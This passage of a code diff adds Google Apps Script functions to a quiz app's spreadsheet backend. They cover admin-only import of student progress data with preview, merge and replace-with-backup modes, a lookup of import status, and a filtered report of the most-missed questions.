+      const identity = sessionIdentity_(session);
+      if (!identity) continue;
+      if (index[identity] === undefined) {
+        index[identity] = result.length;
+        result.push(cloneJson_(session));
+      } else {
+        const i = index[identity];
+        const existing = result[i];
+        result[i] = Object.assign({}, existing, cloneJson_(session));
+        if (existing.qres || session.qres) {
+          result[i].qres = mergeQuestionResults_(existing.qres, session.qres);
+        }
+      }
+    }
+  }
+  result.sort((a, b) => Number(a.at || 0) - Number(b.at || 0));
+  return result.slice(-500); // matches app.js's own recent-sessions cap
+}
+
+function questionResultIdentity_(result) {
+  return (result && typeof result === "object") ? [String(result.uid || ""), String(result.at || ""), result.ok ? "1" : "0"].join("|") : "";
+}
+
+function mergeQuestionResults_(first, second) {
+  const result = [];
+  const seen = {};
+  for (const list of [Array.isArray(first) ? first : [], Array.isArray(second) ? second : []]) {
+    for (const item of list) {
+      if (!item || typeof item !== "object" || !item.uid) continue;
+      const identity = questionResultIdentity_(item);
+      if (!seen[identity]) {
+        seen[identity] = true;
+        result.push(cloneJson_(item));
+      }
+    }
+  }
+  return result.slice(-10000);
+}
+
+function mergeProgressData_(existing, incoming) {
+  existing = existing || {};
+  incoming = incoming || {};
+  const result = Object.assign({}, cloneJson_(existing), cloneJson_(incoming));
+  const existingProg = existing.prog || {};
+  const incomingProg = incoming.prog || {};
+  result.prog = Object.assign({}, cloneJson_(existingProg), cloneJson_(incomingProg));
+  result.prog.sessions = mergeSessions_(existingProg.sessions, incomingProg.sessions);
+  result.prog.total = result.prog.sessions.reduce((t, s) => t + Number(s.total || 0), 0);
+  result.prog.correct = result.prog.sessions.reduce((t, s) => t + Number(s.correct || 0), 0);
+  result.bk = mergeUniqueItemsByUid_(existing.bk, incoming.bk);
+  result.fl = mergeUniqueItemsByUid_(existing.fl, incoming.fl);
+  result.wr = mergeUniqueItemsByUid_(existing.wr, incoming.wr);
+  result.schemaVersion = 2;
+  result.updatedAt = new Date().toISOString();
+  return result;
+}
+
+function getProgressRecordForImport_(sheet, username) {
+  const found = findProgressRow_(sheet, username);
+  if (!found || !found.row || !found.row[1]) return { found: false, rowIndex: null, data: null };
+  try {
+    return { found: true, rowIndex: found.rowIndex, data: parseImportData_(found.row[1]) };
+  } catch (e) {
+    return { found: true, rowIndex: found.rowIndex, data: null, error: "Existing server progress is malformed." };
+  }
+}
+
+function backupProgressRecord_(importId, admin, username, data) {
+  const json = serializeProgressObject_(data);
+  const backupId = Utilities.getUuid();
+  getProgressBackupsSheet_().appendRow([backupId, importId, username, json, new Date().toISOString(), admin || "admin"]);
+  return backupId;
+}
+
+// Accepts a device export as { records: [{username, data}, ...] } (or a
+// single {username, data} / {users: [...]}), validated and applied in
+// one of three modes:
+//   preview — validate only, write nothing, return what WOULD happen
+//   merge   — combine with each user's existing server progress
+//   replace — overwrite (after backing up the prior data so it can be
+//             restored from ProgressBackups if the import was a mistake)
+// mode="preview" is the safe default read-only path for an admin to
+// sanity-check an import file before committing to merge/replace.
+function adminImportProgress(p) {
+  const actor = checkAdmin_(p);
+  if (!actor) return { success: false, error: "Admin auth failed." };
+
+  const mode = normalizeImportMode_(p.mode);
+  if (!mode) return { success: false, error: "mode must be preview, merge, or replace." };
+
+  let rawPayload = (p.payload !== undefined && p.payload !== null) ? p.payload : p.data;
+  if (typeof rawPayload === "string") {
+    if (rawPayload.length > MAX_IMPORT_BODY_CHARS) return { success: false, error: "Import payload is too large." };
+    try { rawPayload = JSON.parse(rawPayload); } catch (e) { return { success: false, error: "Import payload is not valid JSON." }; }
+  }
+  if (!rawPayload || typeof rawPayload !== "object") return { success: false, error: "Import payload must be a JSON object." };
+
+  const records = normalizeImportRecords_(rawPayload);
+  if (!records.length) return { success: false, error: "No import records found." };
+  if (records.length > MAX_IMPORT_RECORDS) return { success: false, error: "Import is limited to " + MAX_IMPORT_RECORDS + " records." };
+
+  const importId = createProgressImportLog_(actor, mode, records.length);
+  const validationErrors = [];
+  const accepted = [];
+  let skipped = 0;
+
+  records.forEach((record, i) => {
+    record = record || {};
+    const username = safeImportString_(record.username, 120);
+    if (!username) {
+      skipped++;
+      validationErrors.push({ index: i, error: "username is required." });
+      return;
+    }
+    let importedData;
+    try {
+      importedData = parseImportData_(record.data !== undefined ? record.data : record.progress);
+    } catch (e) {
+      skipped++;
+      validationErrors.push({ index: i, username, error: e.message });
+      return;
+    }
+    const validation = validateProgressObject_(importedData);
+    if (!validation.valid) {
+      skipped++;
+      validationErrors.push({ index: i, username, error: validation.error });
+      return;
+    }
+    accepted.push({ username, data: importedData });
+  });
+
+  if (mode === "preview") {
+    updateProgressImportLog_(importId, "preview", accepted.length, skipped, validationErrors.length, JSON.stringify(validationErrors).slice(0, 30000));
+    return {
+      success: true, importId, mode, preview: true,
+      recordsReceived: records.length, recordsAccepted: accepted.length,
+      recordsSkipped: skipped, errors: validationErrors
+    };
+  }
+
+  try {
+    return withLock_(() => applyProgressImport_(importId, actor, mode, accepted, validationErrors));
+  } catch (e) {
+    updateProgressImportLog_(importId, "failed", 0, skipped, validationErrors.length + 1, e.message);
+    return { success: false, importId, error: "Import failed: " + e.message };
+  }
+}
+
+function applyProgressImport_(importId, actor, mode, accepted, validationErrors) {
+  const progressSheet = getProgressSheet_();
+  const userSheet = getUsersSheet_();
+  let acceptedCount = 0;
+  let skippedCount = validationErrors.length;
+  const errors = validationErrors.slice();
+
+  accepted.forEach(item => {
+    const username = item.username;
+    const incoming = item.data;
+    const userFound = findUserRow_(userSheet, username);
+    if (!userFound) {
+      skippedCount++;
+      errors.push({ username, error: "User account does not exist." });
+      return;
+    }
+
+    const current = getProgressRecordForImport_(progressSheet, username);
+    if (current.error) {
+      skippedCount++;
+      errors.push({ username, error: current.error });
+      return;
+    }
+
+    let finalData = incoming;
+    if (mode === "merge" && current.found && current.data) {
+      finalData = mergeProgressData_(current.data, incoming);
+    } else if (mode === "replace" && current.found && current.data) {
+      backupProgressRecord_(importId, actor, username, current.data);
+    }
+
+    try {
+      const json = serializeProgressObject_(finalData);
+      const now = new Date().toISOString();
+      if (current.found) {
+        progressSheet.getRange(current.rowIndex, 2, 1, 2).setValues([[json, now]]);
+      } else {
+        progressSheet.appendRow([username, json, now]);
+      }
+      acceptedCount++;
+    } catch (e) {
+      skippedCount++;
+      errors.push({ username, error: e.message });
+    }
+  });
+
+  const status = errors.length ? "completed_with_errors" : "completed";
+  updateProgressImportLog_(importId, status, acceptedCount, skippedCount, errors.length, JSON.stringify(errors).slice(0, 30000));
+  logAction_(actor, "Import Progress Data", importId, "Mode: " + mode + "; accepted: " + acceptedCount + "; skipped: " + skippedCount);
+
+  return { success: true, importId, mode, preview: false, recordsAccepted: acceptedCount, recordsSkipped: skippedCount, errors };
+}
+
+// Looks up a past import by id — lets an admin check on a merge/replace
+// that may have taken a while (a large batch), or re-review what a
+// preview found without re-uploading the same file.
+function adminImportStatus(p) {
+  if (!checkAdmin_(p)) return { success: false, error: "Admin auth failed." };
+  const importId = safeImportString_(p.importId, 100);
+  if (!importId) return { success: false, error: "importId is required." };
+
+  const values = getProgressImportsSheet_().getDataRange().getValues();
+  for (let i = 1; i < values.length; i++) {
+    if (String(values[i][0]) === importId) {
+      let errors = [];
+      if (values[i][10]) {
+        try { errors = JSON.parse(values[i][10]); } catch (e) { errors = [{ error: String(values[i][10]) }]; }
+      }
+      return {
+        success: true,
+        import: {
+          importId: values[i][0], admin: values[i][1], mode: values[i][2], status: values[i][3],
+          recordsReceived: Number(values[i][4] || 0), recordsAccepted: Number(values[i][5] || 0),
+          recordsSkipped: Number(values[i][6] || 0), errorCount: Number(values[i][7] || 0),
+          createdAt: values[i][8], completedAt: values[i][9], errors
+        }
+      };
+    }
+  }
+  return { success: false, error: "Import not found." };
+}
+
+// ── Filtered "most missed questions" reporting ──
+// Aggregates per-question wrong/total attempt counts and unique-student
+// counts across every user's synced progress data, optionally narrowed
+// by level/chapter/book/subtopic and a date range. See the CAVEAT at the
+// top of this section: filters only match attempts whose data actually
+// carries that metadata — uid/fileId/index-based results work regardless.
+function adminMostMissedQuestions(p) {
+  const actor = checkAdmin_(p);
+  if (!actor) return { success: false, error: "Admin auth failed." };
+
+  const filters = {
+    level: safeImportString_(p.level, 120),
+    chapter: safeImportString_(p.chapter, 200),
+    book: safeImportString_(p.book, 200),
+    subtopic: safeImportString_(p.subtopic, 200),
+    dateFrom: safeImportString_(p.dateFrom, 30),
+    dateTo: safeImportString_(p.dateTo, 30),
+    minAttempts: Math.max(1, Math.min(MAX_REPORT_MIN_ATTEMPTS, Number(p.minAttempts) || 3)),
+    limit: Math.max(1, Math.min(MAX_REPORT_LIMIT, Number(p.limit) || 30))
+  };
+
+  const fromTime = parseReportDateFrom_(filters.dateFrom);
+  const toTime = parseReportDateTo_(filters.dateTo);
+  if (filters.dateFrom && fromTime === null) return { success: false, error: "dateFrom must use YYYY-MM-DD format." };
+  if (filters.dateTo && toTime === null) return { success: false, error: "dateTo must use YYYY-MM-DD format." };
+  if (fromTime !== null && toTime !== null && fromTime > toTime) return { success: false, error: "dateFrom cannot be later than dateTo." };
+
+  const sheet = getProgressSheet_();
+  const data = sheet.getDataRange().getValues();
+  const tally = {};
+
+  for (let i = 1; i < data.length; i++) {
+    const username = String(data[i][0] || "").trim();
+    const raw = data[i][1];
+    if (!username || !raw) continue;
+
+    let parsed;
+    try { parsed = JSON.parse(raw); } catch (e) { continue; } // one corrupted row shouldn't kill the whole aggregate
+
+    const sessions = (parsed && parsed.prog && Array.isArray(parsed.prog.sessions)) ? parsed.prog.sessions : [];
+    for (const session of sessions) {
+      if (!session || typeof session !== "object") continue;
+
+      const sessionTime = normalizeReportTime_(session.at);
+      if (sessionTime !== null && fromTime !== null && sessionTime < fromTime) continue;
+      if (sessionTime !== null && toTime !== null && sessionTime > toTime) continue;
+
+      const qres = Array.isArray(session.qres) ? session.qres : [];
+      for (const qr of qres) {
+        if (!qr || !qr.uid) continue;
+
+        const metadata = reportMetadataForQuestion_(qr, session);
+        if (!reportMetadataMatches_(metadata, filters)) continue;
+
+        const uid = String(qr.uid);
+        if (!tally[uid]) {
+          tally[uid] = {
+            uid, fileId: reportFileIdFromUid_(uid), index: reportIndexFromUid_(uid),
+            level: metadata.level, chapter: metadata.chapter, book: metadata.book, subtopic: metadata.subtopic,
+            wrong: 0, total: 0, students: {}, lastAttemptAt: null
+          };
+        }
+        const record = tally[uid];
+        record.total++;
+        if (!qr.ok) record.wrong++;
+        record.students[username] = true;
+
+        const attemptTime = normalizeReportTime_(qr.at || session.at);
+        if (attemptTime !== null && (record.lastAttemptAt === null || attemptTime > record.lastAttemptAt)) {
+          record.lastAttemptAt = attemptTime;
+        }
+        if (!record.level && metadata.level) record.level = metadata.level;
+        if (!record.chapter && metadata.chapter) record.chapter = metadata.chapter;
+        if (!record.book && metadata.book) record.book = metadata.book;
+        if (!record.subtopic && metadata.subtopic) record.subtopic = metadata.subtopic;
+      }
+    }
+  }
+
+  const results = Object.keys(tally)
+    .map(uid => {
+      const record = tally[uid];
+      const studentCount = Object.keys(record.students).length;
+      return {
+        uid: record.uid, fileId: record.fileId, index: record.index,
+        level: record.level || "", chapter: record.chapter || "", book: record.book || "", subtopic: record.subtopic || "",
+        wrong: record.wrong, total: record.total,
+        wrongRate: record.total ? Math.round((record.wrong / record.total) * 100) : 0,
+        accuracy: record.total ? Math.round(((record.total - record.wrong) / record.total) * 100) : 0,
+        uniqueStudents: studentCount,
+        lastAttemptAt: record.lastAttemptAt ? new Date(record.lastAttemptAt).toISOString() : ""
+      };
+    })
+    .filter(record => record.total >= filters.minAttempts && record.fileId !== "local") // exclude locally-imported files — no shared fileId to resolve text from
+    .sort((a, b) => b.wrongRate - a.wrongRate || b.total - a.total || b.uniqueStudents - a.uniqueStudents)
+    .slice(0, filters.limit);
+
+  logAction_(actor, "View Filtered Question Report", "", JSON.stringify(filters).slice(0, 1000));
+
+  return {
+    success: true, results, filters, minAttempts: filters.minAttempts, limit: filters.limit,
+    generatedAt: new Date().toISOString()
+  };
+}
+
+function reportMetadataForQuestion_(questionResult, session) {
+  const metadata = (questionResult && questionResult.meta && typeof questionResult.meta === "object") ? questionResult.meta : {};
+  return {
+    level: String(questionResult.level || metadata.level || questionResult.lv || session.lv || "").trim(),
+    chapter: String(questionResult.chapter || metadata.chapter || questionResult.ch || session.ch || session.chapter || "").trim(),
+    book: String(questionResult.book || metadata.book || session.book || "").trim(),
+    subtopic: String(questionResult.subtopic || metadata.subtopic || questionResult.sub || session.sub || "").trim()
+  };
+}
+
+function reportMetadataMatches_(metadata, filters) {
+  if (filters.level && metadata.level.toLowerCase() !== filters.level.toLowerCase()) return false;
+  if (filters.chapter && metadata.chapter.toLowerCase() !== filters.chapter.toLowerCase()) return false;
+  if (filters.book && metadata.book.toLowerCase() !== filters.book.toLowerCase()) return false;
+  if (filters.subtopic && metadata.subtopic.toLowerCase() !== filters.subtopic.toLowerCase()) return false;
+  return true;
+}
+
+function parseReportDateFrom_(value) {
+  if (!value) return null;
+  if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) return null;
+  const date = new Date(value + "T00:00:00.000Z");
+  return isNaN(date.getTime()) ? null : date.getTime();
+}
+
+function parseReportDateTo_(value) {
+  if (!value) return null;
+  if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) return null;
+  const date = new Date(value + "T23:59:59.999Z");
+  return isNaN(date.getTime()) ? null : date.getTime();
+}
+
+function normalizeReportTime_(value) {
+  if (value === null || value === undefined || value === "") return null;
+  if (typeof value === "number") return isFinite(value) ? value : null;
+  const numeric = Number(value);
+  if (!isNaN(numeric) && numeric > 0) return numeric;
+  const parsed = new Date(String(value));
+  return isNaN(parsed.getTime()) ? null : parsed.getTime();
+}
+
+function reportFileIdFromUid_(uid) {
+  const value = String(uid || "");
+  const match = value.match(/^(.+)_(\d+)$/);
+  return match ? match[1] : value;
+}
+
+function reportIndexFromUid_(uid) {
+  const value = String(uid || "");
+  const match = value.match(/^(.+)_(\d+)$/);
+  return match ? Number(match[2]) : null;
+}
+
 /**
  * Run this ONCE from the Apps Script editor if your spreadsheet already
  * existed before this update — the text-formatting fixes in
@@ -3268,7 +3996,13 @@ function fixSheetFormatting() {
   [1, 2, 3].forEach(col => qr.getRange(2, col, maxRows, 1).setNumberFormat("@"));
   applyTableFormat_(qr, QREPORT_HEADERS, "#d81b60", SpreadsheetApp.BandingTheme.PINK, 340);
 
-  console.log("✅ Sheet formatting fixed/retrofitted on all nine sheets.");
+  const pi = getProgressImportsSheet_();
+  applyTableFormat_(pi, PROGRESS_IMPORT_HEADERS, "#5e35b1", SpreadsheetApp.BandingTheme.PURPLE, 320);
+
+  const pb = getProgressBackupsSheet_();
+  applyTableFormat_(pb, PROGRESS_BACKUP_HEADERS, "#455a64", SpreadsheetApp.BandingTheme.GREY, 320);
+
+  console.log("✅ Sheet formatting fixed/retrofitted on all eleven sheets.");
   return "Sheet formatting fixed. Check View → Logs for details.";
 }
 
